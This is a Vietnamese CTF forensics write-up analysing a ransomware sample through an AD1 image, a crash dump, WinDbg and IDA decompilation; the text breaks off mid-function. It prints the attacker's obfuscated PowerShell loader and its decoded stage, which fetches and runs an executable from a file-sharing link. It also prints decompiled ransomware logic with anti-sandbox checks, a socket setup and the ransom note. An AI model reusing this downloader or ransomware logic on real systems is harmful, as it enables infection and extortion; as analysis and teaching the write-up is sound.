<img width="1538" height="827" alt="image" src="https://github.com/user-attachments/assets/f8dffd06-44f9-4717-93e9-2a8867e5a808" />
Sau khi tải chall thì mình thu được 1 file ad1, mình tiến hành load vào FTK để phân tích
<img width="1822" height="873" alt="image" src="https://github.com/user-attachments/assets/4f36bb64-c1af-4a7e-aa38-b42ab8620e12" />
Check phần downloads của user thì mình thấy những file đã bị encrypt , vậy nên nhiệm vụ của chúng ta là decrypt nó
<img width="1777" height="850" alt="image" src="https://github.com/user-attachments/assets/1c56d0c7-536e-4193-bd17-3a45a809979f" />
Ngoài ra mình còn tìm thấy 1 file tống tiền 
<img width="1792" height="993" alt="image" src="https://github.com/user-attachments/assets/7a304076-d182-4392-a9a4-02892a1a1c78" />
Đây là dấu hiệu điển hình của 1 cuộc tấn công ransomeware, bây giờ chúng ta cần tìm mã nguồn của malware

<img width="1885" height="975" alt="image" src="https://github.com/user-attachments/assets/24d79ffb-f0a2-41e4-a5e1-837402494e55" />

Dấu vết đầu tiên là một lệnh PowerShell chứa chuỗi Base64 bắt đầu bằng H4sI, chữ ký của gzip. Lệnh giải Base64, giải nén bằng GzipStream, đọc ra text rồi chạy bằng Invoke-Expression
```
$compressed = 'H4sIAAAAAAAA/2SOQQuCQBBG74L/YRCvqxGdhG4adBDFsgi6WEw6ZLu2M0r062M9dKjbHN6b94Ub6rG2Pawh6EQGTuL4Rj1GZOJDtWqXj3dWpItT4Hu+F6bIQroRMrpspHNSiHpK9llenvMh50y3Eb5wprd6MndUR7xU+ByRBVRtCb5FVYzibvh96+SdNFZUac0VmUE5bi7+TfC9TwAAAP//xx9uYsMAAAA='; $bytes = [System.Convert]::FromBase64String($compressed); $stream = New-Object IO.MemoryStream(, $bytes); $decompressed = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader($decompressed); $obfuscated = $reader.ReadToEnd(); Invoke-Expression $obfuscated
```
Mình sẽ tiến hành decode lại và thu được kết quả như sau 
```
$FileUrl = "https://file.io/VR4g2mzEOD0Y"
$DestinationPath = "$env:TEMP\MpMsEng.exe"
Invoke-WebRequest -Uri $FileUrl -OutFile $DestinationPath
Start-Process -FilePath $DestinationPath
```
• Đây là downloader hai tầng: tầng ngoài chỉ che giấu, tầng trong tải và chạy file thực thi.
• MpMsEng.exe đổi chỗ hai chữ cái so với MsMpEng.exe, tiến trình thật của Windows Defender. File đặt trong %TEMP% thay vì thư mục Defender nên rõ ràng là giả mạo.
• file.io là dịch vụ chia sẻ file dùng một lần, nên link khó còn sống và không thể tải lại mẫu. Đây là lý do cần lấy malware từ dump.
• Chưa xác định được nơi lệnh PowerShell được kích hoạt (initial access) vì AD1 không chứa event log hay lịch sử PowerShell.

Malware sau khi chạy xong thì tự xóa ra khỏi folder temp rồi nên khỏi tìm làm gì cho mệt, vậy thì ngoài temp ra chúng ta có thể tìm ở đâu?
Câu trả lời chính là trong ram. Nhưng mà lưu ý việc phân tích mem của 1 process thì chúng ta sẽ cố gắng tìm kiếm file dmp trong FTK .
Với tư duy đó , mình trích toàn bộ ổ root của evidence xong dùng powershell để quét
```
Get-ChildItem "D:\DFIR LABS\extracted" -Recurse -File -Force -ErrorAction SilentlyContinue | ForEach-Object {
  try {
    $fs = [IO.File]::OpenRead($_.FullName)
    $b = New-Object byte[] 8; [void]$fs.Read($b,0,8); $fs.Close()
    $h = [Text.Encoding]::ASCII.GetString($b)
    if ($h -like "MDMP*" -or $h -like "PAGEDU*") { "$($_.FullName)  [$h]  $($_.Length)" }
  } catch {}
}
```
Mình thu được kết quả như sau:
Kết quả: Windows\System32\config\systemprofile\AppData\Local\CrashDumps\crash.dmp, header MDMP, 20,233,870 byte.
Tiến hành export crash.dmp rồi load vào windbg thôi.

<img width="1867" height="1020" alt="image" src="https://github.com/user-attachments/assets/618a29f6-b565-4f1f-8c10-4dd4df05f197" />

Load vào windbg và cho chạy lệnh !analyze và thu được metadata như sau:
<img width="1557" height="935" alt="image" src="https://github.com/user-attachments/assets/0a60f377-a520-4f2d-922b-b1ce5aa3841f" />
• Dòng comment cho thấy dump do "Z:\procdump\procdump.exe" -ma -w -t -n 1 MpMsEng.exe -o ...\crash.dmp tạo ra. -ma là full memory dump, -w chờ tiến trình khởi chạy, -t dump khi tiến trình kết thúc.
• procdump chạy từ ổ Z: và ghi vào systemprofile, tức chạy dưới tài khoản SYSTEM. Đây nhiều khả năng là công cụ giám sát/thu thập đặt sẵn trên máy, không phải do kẻ tấn công.
• Ngoại lệ 0x80000003 (breakpoint) tại ntdll!NtTerminateProcess. Stack: ucrtbase!common_exit → ucrtbase!exit_or_terminate_process → ntdll!RtlExitUserProcess, nghĩa là malware gọi exit() bình thường, không phải crash thật.
• Frame của malware: MpMsEng+0x38693 = 00007ff7'71c58693. Timeline.Process.Start.DeltaSec = 40: tiến trình đã chạy khoảng 40 giây, phù hợp với các bước chờ chống sandbox 
• OS: Windows 10 22H2 (10.0.19045.1), x64.

Mình sẽ tiến hành Trích module MpMsEng.
<img width="971" height="791" alt="image" src="https://github.com/user-attachments/assets/54895728-646d-4ba0-afda-4940319fa1fa" />

Sau khi trích thành công mình load lên virustotal
<img width="1900" height="868" alt="image" src="https://github.com/user-attachments/assets/70061d20-b175-40d3-af6f-0ea57ea4dcc4" />
Dạng này là mapped (section theo Virtual Address) nên phải unmap về dạng file trên đĩa. Mình viết 1 script là unmap.py ọc PE header, copy từng section từ VA về PointerToRawData, đặt ImageBase = 0x7FF771C20000 để con trỏ trong dữ liệu khớp địa chỉ thật.

```
import struct, sys

src, dst = sys.argv[1], sys.argv[2]
data = open(src, "rb").read()

lfa = struct.unpack_from("<I", data, 0x3C)[0]
assert data[lfa:lfa+4] == b"PE\0\0", "Khong thay PE header"
nsec = struct.unpack_from("<H", data, lfa+6)[0]
opt_size = struct.unpack_from("<H", data, lfa+20)[0]
opt = lfa + 24
assert struct.unpack_from("<H", data, opt)[0] == 0x20B, "Khong phai PE32+ (x64)"
hdr_size = struct.unpack_from("<I", data, opt+60)[0]
sec_table = opt + opt_size

out = bytearray(data[:hdr_size])
for i in range(nsec):
    off = sec_table + 40*i
    name = data[off:off+8].rstrip(b"\0").decode(errors="replace")
    vsize, va, rsize, raw = struct.unpack_from("<IIII", data, off+8)
    n = min(rsize, vsize) if vsize else rsize
    chunk = data[va:va+n]
    if len(out) < raw + rsize:
        out.extend(b"\0" * (raw + rsize - len(out)))
    out[raw:raw+len(chunk)] = chunk
    print(f"{name:8} VA={va:#x} vsize={vsize:#x} raw={raw:#x} rsize={rsize:#x}")

# Dat ImageBase = dia chi thuc te luc chay (con tro trong data da duoc loader fix)
struct.pack_into("<Q", out, opt+24, 0x00007FF771C20000)

open(dst, "wb").write(out)
print("Da ghi", dst, len(out), "bytes")

```
<img width="1397" height="767" alt="image" src="https://github.com/user-attachments/assets/3eee2fbc-067d-4d13-a9ee-811fe138d71d" />
 Chạy script mà quên tắt av...
 <img width="1847" height="895" alt="image" src="https://github.com/user-attachments/assets/f2d78ba7-19c0-4a3a-a447-33b511a95762" />

Mình sẽ load vào IDA để đọc mã nguồn
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+20h] [rbp-18h]
  __int64 (__fastcall *v5)(); // [rsp+30h] [rbp-8h] BYREF

  v5 = sub_7FF771C22D80;
  v4 = 0;
  return sub_7FF771C31F40(&v5, &off_7FF771C5C210, argc, argv, v4);
}
```
Đây là hàm main của malware,Hàm main chỉ gọi một hàm khởi động chung với con trỏ hàm chương trình thật, đúng mẫu std::rt::lang_start(main, argc, argv, sigpipe) của Rust. Hàm chương trình thật là sub_7FF771C22D80. VirusTotal và DIE ghi "MSVC C/C++" vì Rust trên Windows build bằng toolchain MSVC.
```
// bad sp value at call has been detected, the output may be wrong!
__int64 sub_7FF771C22D80()
{
  __int64 v0; // rax
  __int64 v1; // rsi
  __int64 *v2; // rax
  __int64 v3; // rax
  __m128i v4; // xmm6
  __int64 v5; // rax
  __int64 v6; // rbx
  unsigned int v8; // ebx
  unsigned int v9; // ebx
  unsigned __int128 v10; // rax
  __int64 v11; // rsi
  __int64 v12; // r15
  __int64 v13; // rax
  __int64 v14; // rdx
  __int64 v15; // rax
  __int64 v16; // rdx
  __int64 v17; // rdx
  _QWORD *v18; // rcx
  bool v19; // zf
  __int64 v20; // rax
  __int64 v21; // rdx
  __int64 v22; // rax
  __int64 v23; // rdx
  __int64 v24; // rax
  __int64 v25; // rdx
  tagLASTINPUTINFO v26; // rax
  __int64 v27; // rcx
  __int64 v28; // rcx
  void (**v29)(void); // rax
  void (*v30)(void); // rdx
  __int64 v31; // rax
  __int64 v32; // rdx
  __int64 v33; // rdx
  __int64 v34; // rax
  __int64 v35; // rdx
  __int64 v36; // rax
  __int64 v37; // rdx
  __int64 v38; // rbx
  __int64 v39; // rax
  __int64 v40; // rdx
  __int64 v41; // rbx
  char **v42; // rdx
  char **v43; // r13
  unsigned __int64 v44; // rbx
  char *v45; // r14
  __int64 v46; // rdx
  char ***v47; // rax
  __int64 v48; // rax
  __int64 v49; // rdx
  __int64 v50; // rcx
  bool v51; // cf
  unsigned __int64 v52; // rdx
  __int64 v53; // r14
  tagLASTINPUTINFO v54; // rax
  __int64 v55; // rdx
  __int64 v56; // rdx
  __int64 v57; // rcx
  unsigned __int64 v58; // rdx
  __int64 v59; // r14
  tagLASTINPUTINFO v60; // rax
  __int64 v61; // rdx
  __int64 v62; // rax
  unsigned __int64 v63; // rcx
  __int64 v64; // r14
  tagLASTINPUTINFO v65; // rsi
  void (**v66)(void); // rax
  void (*v67)(void); // rdx
  unsigned __int64 v68; // rsi
  char *v69; // rdi
  char **v70; // r13
  unsigned __int64 v71; // rsi
  const char *v72; // rdi
  int v73; // eax
  char ***v74; // rax
  __int64 v75; // rsi
  unsigned __int64 v76; // rdi
  __int64 v77; // r15
  char **v78; // r12
  __int64 v79; // rax
  __int64 v80; // rsi
  __int64 *v81; // rax
  __int64 v82; // rax
  void (**v83)(void); // rcx
  void (**v84)(void); // rax
  void (*v85)(void); // rdx
  __int64 v86; // rax
  void (**v87)(void); // rcx
  void (**v88)(void); // rax
  void (*v89)(void); // rdx
  __int64 v90; // rax
  void (**v91)(void); // rcx
  void (**v92)(void); // rax
  void (*v93)(void); // rdx
  __int64 v94; // rax
  void (**v95)(void); // rcx
  void (**v96)(void); // rax
  void (*v97)(void); // rdx
  __int64 v98; // rax
  void (**v99)(void); // rcx
  void (**v100)(void); // rax
  void (*v101)(void); // rdx
  __int64 v102; // rax
  void (**v103)(void); // rcx
  void (**v104)(void); // rax
  void (*v105)(void); // rdx
  __int64 v106; // rax
  void (**v107)(void); // rcx
  void (**v108)(void); // rax
  void (*v109)(void); // rdx
  __int64 v110; // rax
  void (**v111)(void); // rcx
  void (**v112)(void); // rax
  void (*v113)(void); // rdx
  __int64 v114; // rax
  void (**v115)(void); // rcx
  void (**v116)(void); // rax
  void (*v117)(void); // rdx
  _QWORD *v118; // rcx
  char ***v119; // rax
  unsigned __int128 v120; // [rsp+30h] [rbp-50h] BYREF
  __int64 v121; // [rsp+40h] [rbp-40h] BYREF
  __int64 v122; // [rsp+48h] [rbp-38h]
  __int128 v123; // [rsp+60h] [rbp-20h]
  __int64 v124; // [rsp+70h] [rbp-10h]
  __int128 v125; // [rsp+80h] [rbp+0h]
  unsigned __int64 v126; // [rsp+90h] [rbp+10h]
  __int128 v127; // [rsp+A0h] [rbp+20h] BYREF
  unsigned __int64 v128; // [rsp+B0h] [rbp+30h]
  unsigned __int128 *v129; // [rsp+C0h] [rbp+40h] BYREF
  __int64 (__fastcall *v130)(); // [rsp+C8h] [rbp+48h]
  SOCKET s[2]; // [rsp+E0h] [rbp+60h] BYREF
  unsigned __int64 v132; // [rsp+F0h] [rbp+70h]
  int v133; // [rsp+104h] [rbp+84h] BYREF
  HANDLE hObject[2]; // [rsp+108h] [rbp+88h] BYREF
  unsigned __int64 v135; // [rsp+118h] [rbp+98h]
  _QWORD *v136; // [rsp+120h] [rbp+A0h]
  __int128 v137; // [rsp+128h] [rbp+A8h] BYREF
  __int128 v138; // [rsp+138h] [rbp+B8h]
  tagLASTINPUTINFO *v139; // [rsp+148h] [rbp+C8h]
  __int64 v140; // [rsp+150h] [rbp+D0h]
  __int64 v141; // [rsp+158h] [rbp+D8h]
  tagLASTINPUTINFO plii[2]; // [rsp+160h] [rbp+E0h] BYREF
  _BYTE v143[24]; // [rsp+170h] [rbp+F0h]
  __int64 v144; // [rsp+188h] [rbp+108h]
  char v145; // [rsp+190h] [rbp+110h]
  tagLASTINPUTINFO v146; // [rsp+1A8h] [rbp+128h] BYREF
  __int64 v147; // [rsp+1B0h] [rbp+130h]
  __int64 v148; // [rsp+1B8h] [rbp+138h]
  __int64 v149; // [rsp+1C0h] [rbp+140h]
  void (**v150)(void); // [rsp+1C8h] [rbp+148h]
  void (**v151)(void); // [rsp+1D0h] [rbp+150h]
  __int64 v152; // [rsp+1D8h] [rbp+158h]

  v152 = -2LL;
  if ( IsDebuggerPresent() )
  {
    v0 = sub_7FF771C22830();
    if ( v0 )
    {
      v1 = v0;
      plii[0] = (tagLASTINPUTINFO)v0;
      v2 = (__int64 *)sub_7FF771C27550(8LL, 8LL);
      if ( !v2 )
        sub_7FF771C5A4A0(8LL, 8LL);
LABEL_12:
      v6 = (__int64)v2;
      *v2 = v1;
      return v6;
    }
    goto LABEL_268;
  }
  plii[0] = (tagLASTINPUTINFO)&off_7FF771C5B5F0;
  plii[1] = 0LL;
  *(_QWORD *)v143 = &off_7FF771C5B5F0;
  *(_OWORD *)&v143[8] = 0LL;
  sub_7FF771C348E0(plii);
  plii[0] = (tagLASTINPUTINFO)8LL;
  GetLastInputInfo(plii);
  if ( GetTickCount() - plii[0].dwTime > 0xEA5F )
  {
    v3 = sub_7FF771C22830();
    if ( v3 )
    {
      v1 = v3;
      plii[0] = (tagLASTINPUTINFO)v3;
      v2 = (__int64 *)sub_7FF771C27550(8LL, 8LL);
      if ( !v2 )
        sub_7FF771C5A4A0(8LL, 8LL);
      goto LABEL_12;
    }
LABEL_268:
    sub_7FF771C38D20(0LL);
  }
  plii[0] = 0LL;
  GetCursorPos((LPPOINT)plii);
  v4 = _mm_loadl_epi64((const __m128i *)plii);
  Sleep(0x1388u);
  GetCursorPos((LPPOINT)plii);
  if ( _mm_movemask_pd((__m128d)_mm_shuffle_epi32(_mm_cmpeq_epi32(_mm_loadl_epi64((const __m128i *)plii), v4), 80)) == 3 )
  {
    v5 = sub_7FF771C22830();
    if ( v5 )
    {
      v1 = v5;
      plii[0] = (tagLASTINPUTINFO)v5;
      v2 = (__int64 *)sub_7FF771C27550(8LL, 8LL);
      if ( !v2 )
        sub_7FF771C5A4A0(8LL, 8LL);
      goto LABEL_12;
    }
    goto LABEL_268;
  }
  v8 = 0;
  do
  {
    v8 += (unsigned __int16)GetAsyncKeyState(2) >> 15;
    Sleep(0x64u);
  }
  while ( v8 < 5 );
  v9 = 0;
  do
  {
    v9 += (unsigned __int16)GetAsyncKeyState(1) >> 15;
    Sleep(0x64u);
  }
  while ( v9 < 6 );
  v136 = (_QWORD *)sub_7FF771C27640();
  do
    *(_QWORD *)&v10 = sub_7FF771C26CA0(v136);
  while ( (v10 & 0x80000000) != 0LL );
  v120 = v10 >> 32;
  v129 = &v120;
  v130 = sub_7FF771C57690;
  plii[0] = (tagLASTINPUTINFO)2LL;
  *(_QWORD *)v143 = 0LL;
  *(_QWORD *)&v143[8] = 24LL;
  *(_QWORD *)&v143[16] = 0LL;
  v144 = 0x800000020LL;
  v145 = 3;
  *(_QWORD *)&v137 = &off_7FF771C5C100;
  *((_QWORD *)&v137 + 1) = 1LL;
  v139 = plii;
  v140 = 1LL;
  *(_QWORD *)&v138 = &v129;
  *((_QWORD *)&v138 + 1) = 1LL;
  sub_7FF771C51C50(&v127, &v137);
  v125 = v127;
  v126 = v128;
  if ( v128 <= 0xB )
    sub_7FF771C5AA80(12LL, v128, &off_7FF771C5C110);
  v149 = v125;
  sub_7FF771C32950(&v137, &unk_7FF771C5C128, 8LL);
  if ( BYTE8(v138) != 3 )
  {
    *(_OWORD *)v143 = v138;
    *(_OWORD *)&plii[0].cbSize = v137;
    sub_7FF771C5A960(
      (unsigned int)asc_7FF771C5C0E6,
      1,
      (unsigned int)plii,
      (unsigned int)&off_7FF771C5B630,
      (__int64)&off_7FF771C5C130);
  }
  v11 = v138;
  v124 = v138;
  v123 = v137;
  v12 = v137;
  sub_7FF771C38970(plii, aCUsers, 8LL, v137, v138);
  v13 = sub_7FF771C408D0(plii);
  sub_7FF771C38970(&v121, v13, v14, aDownloadsdeskt, 9LL);
  if ( plii[1] )
    sub_7FF771C27560(*(_QWORD *)plii, *(_QWORD *)&plii[1], 1LL);
  v15 = sub_7FF771C408D0(&v121);
  v6 = sub_7FF771C21670(v15, v16, v149);
  if ( v6 )
  {
    v17 = v122;
    if ( !v122 )
    {
LABEL_27:
      if ( *((_QWORD *)&v123 + 1) )
        sub_7FF771C27560(v123, *((_QWORD *)&v123 + 1), 1LL);
      if ( *((_QWORD *)&v125 + 1) )
        sub_7FF771C27560(v125, *((_QWORD *)&v125 + 1), 1LL);
      v18 = v136;
      v19 = (*v136)-- == 1LL;
      if ( v19 )
      {
        v19 = v18[1]-- == 1LL;
        if ( v19 )
          sub_7FF771C27560(v18, 368LL, 16LL);
      }
      return v6;
    }
LABEL_26:
    sub_7FF771C27560(v121, v17, 1LL);
    goto LABEL_27;
  }
  sub_7FF771C38970(plii, aCUsers, 8LL, v12, v11);
  v20 = sub_7FF771C408D0(plii);
  sub_7FF771C38970(&v129, v20, v21, &aDownloadsdeskt[9], 7LL);
  if ( plii[1] )
    sub_7FF771C27560(*(_QWORD *)plii, *(_QWORD *)&plii[1], 1LL);
  v22 = sub_7FF771C408D0(&v129);
  sub_7FF771C38970(&v127, v22, v23, &aDownloadsdeskt[16], 10LL);
  v24 = sub_7FF771C408D0(&v127);
  sub_7FF771C3F3F0(plii, v24, v25);
  if ( plii[0].cbSize == 2 )
  {
    v26 = plii[1];
    v27 = plii[1].cbSize & 3;
    if ( (unsigned __int64)(v27 - 2) >= 2 )
    {
LABEL_38:
      if ( v27 )
      {
        v150 = (void (**)(void))(*(_QWORD *)&v26 - 1LL);
        v28 = *(_QWORD *)(*(_QWORD *)&v26 - 1LL);
        v29 = *(void (***)(void))(*(_QWORD *)&v26 + 7LL);
        v141 = v28;
        v151 = v29;
        (*v29)();
        v30 = v151[1];
        if ( v30 )
          sub_7FF771C27560(v141, v30, v151[2]);
        sub_7FF771C27560(v150, 24LL, 8LL);
      }
    }
    v31 = sub_7FF771C408D0(&v129);
    sub_7FF771C38970(
      &v137,
      v31,
      v32,
      "Azr43l_README.txtDo What happened to your files?\n"
      "All of your files have been secured by a powerful encryption!\n"
      "The only way to retrieve your files is to pay the Knightfallen.\n"
      "He is lurking everywhere and anywhere.\n"
      "He watches you through security cameras, phone, computer...\n"
      "even through your very own eyes\n"
      "and the passersby around you.\n"
      "You cannot escape him.\n"
      "You cannot hide from him.\n"
      "You cannot run from him.\n"
      "You cannot even eliminate him.\n"
      "He is omnipresent.\n"
      "For He the Knightfallen.\n"
      "And here you are, trapped by the kn1ghtw4re.\n"
      "                                     \n"
      "            X             .     .             X\n"
      "          /XX/            |\\___/|            \\XX\\\n"
      "        /XXXX\\            |XXXXX|            /XXXX\\\n"
      "       |XXXXXX\\_         _XXXXXXX_         _/XXXXXX|\n"
      "      XXXXXXXXXXXxxxxxxxXXXXXXXXXXXxxxxxxxXXXXXXXXXXX\n"
      "     |XXXXXXXXXXXXXXXXXX_Infection_XXXXXXXXXXXXXXXXXX|\n"
      "     XXXXXXXXXXXXXXXXXXX_kn1ghtw4re_XXXXXXXXXXXXXXXXXXX\n"
      "     |XXXXXXXXXXXXXXXXXX_x*x*x*x*x*_XXXXXXXXXXXXXXXXX|\n"
      "      XXXXXX/^^^^\"\\XXXXXXXXXXXXXXXXXXXXX/^^^^^\\XXXXXX\n"
      "       |XXX|       \\XXX/^^\\XXXXX/^^\\XXX/       |XXX|\n"
      "         \\XX\\       \\X/    \\XXX/    \\X/       /XX/\n"
      "           X         V      \\X/      V         X\n"
      "                             V\n"
      "\n"
      "Don't attempt to decrypt your files; it will only worsen the situation.\n"
      "Don't try to find kn1ghtw4re; it will only exacerbate your troubles.\n"
      "You have two choices:\n"
      "Wait for a miracle to occur and watch the price escalate as time slips away.\n"
      "Or pay kn1ghtw4re, the Knightfallen, to regain access to your files.\n"
      "You can send me at least $15000 worth of gift cards\n"
      "to my email: kn1ghtfallBatman@icc.com\n"
      "and I will provide you with the decryption software crafted by \n"
      "your very own harbinger of doom.\n"
      "Do not track the gift cards; I will simply sell them to an unsuspecting victim on the dark web.\n"
      "For any questions or inquiries,\n"
      "you can reach me at queries.kn1ghtw4re@icc.com.\n"
      "You have 69 hours to make your decision.\n"
      "The clock is ticking... mate...\n"
      "it goes tic and toc, and you are still here.\n",
      17LL);
    sub_7FF771C32F70(plii);
    LOBYTE(v33) = 1;
    v34 = sub_7FF771C32FB0(plii, v33);
    LOBYTE(v35) = 1;
    v36 = sub_7FF771C32FD0(v34, v35);
    LOBYTE(v37) = 1;
    v38 = sub_7FF771C32FC0(v36, v37);
    v39 = sub_7FF771C408D0(&v137);
    v41 = sub_7FF771C32FE0(v38, v39, v40);
    v43 = v42;
    if ( *((_QWORD *)&v137 + 1) )
      sub_7FF771C27560(v137, *((_QWORD *)&v137 + 1), 1LL);
    if ( v41 )
      goto LABEL_57;
    hObject[0] = v43;
    v44 = 2003LL;
    v45 = "Do What happened to your files?\nAll of your files have been secured by a powerful encryption!\nThe only way to retrieve your files is to pay the Knightfallen.\nHe is lurking everywhere and anywhere.\nHe watches you through security cameras, phone, computer...\neven through your very own eyes\nand the passersby around you.\nYou cannot escape him.\nYou cannot hide from him.\nYou cannot run from him.\nYou cannot even eliminate him.\nHe is omnipresent.\nFor He the Knightfallen.\nAnd here you are, trapped by the kn1ghtw4re.\n                                     \n            X             .     .             X\n          /XX/            |\\___/|            \\XX\\\n        /XXXX\\            |XXXXX|            /XXXX\\\n       |XXXXXX\\_         _XXXXXXX_         _/XXXXXX|\n      XXXXXXXXXXXxxxxxxxXXXXXXXXXXXxxxxxxxXXXXXXXXXXX\n     |XXXXXXXXXXXXXXXXXX_Infection_XXXXXXXXXXXXXXXXXX|\n     XXXXXXXXXXXXXXXXXXX_kn1ghtw4re_XXXXXXXXXXXXXXXXXXX\n     |XXXXXXXXXXXXXXXXXX_x*x*x*x*x*_XXXXXXXXXXXXXXXXX|\n      XXXXXX/^^^^\"\\XXXXXXXXXXXXXXXXXXXXX/^^^^^\\XXXXXX\n       |XXX|       \\XXX/^^\\XXXXX/^^\\XXX/       |XXX|\n         \\XX\\       \\X/    \\XXX/    \\X/       /XX/\n           X         V      \\X/      V         X\n                             V\n\nDon't attempt to decrypt your files; it will only worsen the situation.\nDon't try to find kn1ghtw4re; it will only exacerbate your troubles.\nYou have two choices:\nWait for a miracle to occur and watch the price escalate as time slips away.\nOr pay kn1ghtw4re, the Knightfallen, to regain access to your files.\nYou can send me at least $15000 worth of gift cards\nto my email: kn1ghtfallBatman@icc.com\nand I will provide you with the decryption software crafted by \nyour very own harbinger of doom.\nDo not track the gift cards; I will simply sell them to an unsuspecting victim on the dark web.\nFor any questions or inquiries,\nyou can reach me at queries.kn1ghtw4re@icc.com.\nYou have 69 hours to make your decision.\nThe clock is ticking... mate...\nit goes tic and toc, and you are still here.\n";
    while ( 1 )
    {
      sub_7FF771C32F40(plii, hObject, v45, v44);
      if ( plii[0] )
      {
        v43 = (char **)plii[1];
        v26 = (tagLASTINPUTINFO)(plii[1].cbSize & 3);
        switch ( v46 )
        {
          case 0LL:
            goto LABEL_56;
          case 1LL:
            if ( plii[1].dwTime != 35 )
              goto LABEL_56;
            goto LABEL_46;
          default:
            goto LABEL_38;
        }
      }
      if ( !*(_QWORD *)&plii[1] )
        break;
      if ( v44 < *(_QWORD *)&plii[1] )
        sub_7FF771C5AA00(*(_QWORD *)&plii[1], v44, &off_7FF771C5C418);
      v45 += *(_QWORD *)&plii[1];
      v44 -= *(_QWORD *)&plii[1];
LABEL_46:
      if ( !v44 )
      {
        v43 = 0LL;
        goto LABEL_56;
      }
    }
    v43 = &off_7FF771C5C400;
LABEL_56:
    CloseHandle(hObject[0]);
    if ( v43 )
    {
LABEL_57:
      plii[0] = (tagLASTINPUTINFO)v43;
      v47 = (char ***)sub_7FF771C27550(8LL, 8LL);
      if ( !v47 )
        sub_7FF771C5A4A0(8LL, 8LL);
      v6 = (__int64)v47;
      *v47 = v43;
      goto LABEL_250;
    }
  }
  v48 = sub_7FF771C27550(3LL, 1LL);
  if ( !v48 )
    sub_7FF771C5A4A0(1LL, 3LL);
  *(_BYTE *)(v48 + 2) = 50;
  *(_WORD *)v48 = 14641;
  v146 = (tagLASTINPUTINFO)v48;
  v147 = 3LL;
  v148 = 3LL;
  sub_7FF771C26BD0(&v146, 3LL);
  *(_BYTE *)(*(_QWORD *)&v146 + v148) = 46;
  v49 = v148 + 1;
  v148 = v49;
  v50 = v147 - v49;
  if ( (unsigned __int64)(v147 - v49) <= 2 )
  {
    v51 = __CFADD__(v49, 3LL);
    v52 = v49 + 3;
    if ( v51 )
      goto LABEL_72;
    if ( 2 * v147 > v52 )
      v52 = 2 * v147;
    v53 = 8LL;
    if ( v52 >= 9 )
      v53 = v52;
    if ( v147 )
    {
      plii[0] = v146;
      plii[1] = (tagLASTINPUTINFO)1LL;
      *(_QWORD *)v143 = v147;
    }
    else
    {
      plii[1] = 0LL;
    }
    sub_7FF771C26AD0(&v137, v53 >= 0, v53, plii);
    v50 = *((_QWORD *)&v137 + 1);
    if ( (_QWORD)v137 )
    {
      if ( *((_QWORD *)&v137 + 1) != 0x8000000000000001uLL )
      {
        if ( *((_QWORD *)&v137 + 1) )
          sub_7FF771C5A4A0(*((_QWORD *)&v137 + 1), v138);
LABEL_72:
        sub_7FF771C51860(v50);
      }
    }
    else
    {
      v146 = (tagLASTINPUTINFO)*((_QWORD *)&v137 + 1);
      v147 = v53;
    }
    v49 = v148;
  }
  v54 = v146;
  *(_BYTE *)(*(_QWORD *)&v146 + v49 + 2) = 56;
  *(_WORD *)(*(_QWORD *)&v54 + v49) = 13873;
  v55 = v49 + 3;
  v148 = v55;
  if ( v55 == v147 )
  {
    sub_7FF771C26BD0(&v146, v55);
    v55 = v148;
  }
  *(_BYTE *)(*(_QWORD *)&v146 + v55) = 46;
  v56 = v148 + 1;
  v148 = v56;
  v57 = v147 - v56;
  if ( (unsigned __int64)(v147 - v56) <= 2 )
  {
    v51 = __CFADD__(v56, 3LL);
    v58 = v56 + 3;
    if ( v51 )
      goto LABEL_89;
    if ( 2 * v147 > v58 )
      v58 = 2 * v147;
    v59 = 8LL;
    if ( v58 >= 9 )
      v59 = v58;
    if ( v147 )
    {
      plii[0] = v146;
      plii[1] = (tagLASTINPUTINFO)1LL;
      *(_QWORD *)v143 = v147;
    }
    else
    {
      plii[1] = 0LL;
    }
    sub_7FF771C26AD0(&v137, v59 >= 0, v59, plii);
    v57 = *((_QWORD *)&v137 + 1);
    if ( (_QWORD)v137 )
    {
      if ( *((_QWORD *)&v137 + 1) != 0x8000000000000001uLL )
      {
        if ( *((_QWORD *)&v137 + 1) )
          sub_7FF771C5A4A0(*((_QWORD *)&v137 + 1), v138);
LABEL_89:
        sub_7FF771C51860(v57);
      }
    }
    else
    {
      v146 = (tagLASTINPUTINFO)*((_QWORD *)&v137 + 1);
      v147 = v59;
    }
    v56 = v148;
  }
  v60 = v146;
  *(_BYTE *)(*(_QWORD *)&v146 + v56 + 2) = 51;
  *(_WORD *)(*(_QWORD *)&v60 + v56) = 12337;
  v61 = v56 + 3;
  v148 = v61;
  if ( v61 == v147 )
  {
    sub_7FF771C26BD0(&v146, v61);
    v61 = v148;
  }
  *(_BYTE *)(*(_QWORD *)&v146 + v61) = 46;
  v62 = v148 + 1;
  v148 = v62;
  if ( v147 == v62 )
  {
    v63 = v62 + 1;
    if ( v62 == -1 )
      goto LABEL_106;
    if ( 2 * v62 > v63 )
      v63 = 2 * v62;
    v64 = 8LL;
    if ( v63 >= 9 )
      v64 = v63;
    if ( v62 )
    {
      plii[0] = v146;
      plii[1] = (tagLASTINPUTINFO)1LL;
      *(_QWORD *)v143 = v62;
    }
    else
    {
      plii[1] = 0LL;
    }
    sub_7FF771C26AD0(&v137, v64 >= 0, v64, plii);
    v63 = *((_QWORD *)&v137 + 1);
    if ( (_QWORD)v137 )
    {
      if ( *((_QWORD *)&v137 + 1) != 0x8000000000000001uLL )
      {
        if ( *((_QWORD *)&v137 + 1) )
          sub_7FF771C5A4A0(*((_QWORD *)&v137 + 1), v138);
LABEL_106:
        sub_7FF771C51860(v63);
      }
    }
    else
    {
      v146 = (tagLASTINPUTINFO)*((_QWORD *)&v137 + 1);
      v147 = v64;
    }
    v62 = v148;
  }
  *(_BYTE *)(*(_QWORD *)&v146 + v62) = 51;
  v148 = v62 + 1;
  v133 = 6969;
  *(_QWORD *)&v137 = &v146;
  *((_QWORD *)&v137 + 1) = sub_7FF771C21630;
  *(_QWORD *)&v138 = &v133;
  *((_QWORD *)&v138 + 1) = sub_7FF771C57C00;
  plii[0] = (tagLASTINPUTINFO)&off_7FF771C5C170;
  plii[1] = (tagLASTINPUTINFO)2LL;
  *(_QWORD *)&v143[16] = 0LL;
  *(_QWORD *)v143 = &v137;
  *(_QWORD *)&v143[8] = 2LL;
  sub_7FF771C51C50(hObject, plii);
  *(_OWORD *)s = *(_OWORD *)hObject;
  v132 = v135;
  sub_7FF771C270D0(plii, s);
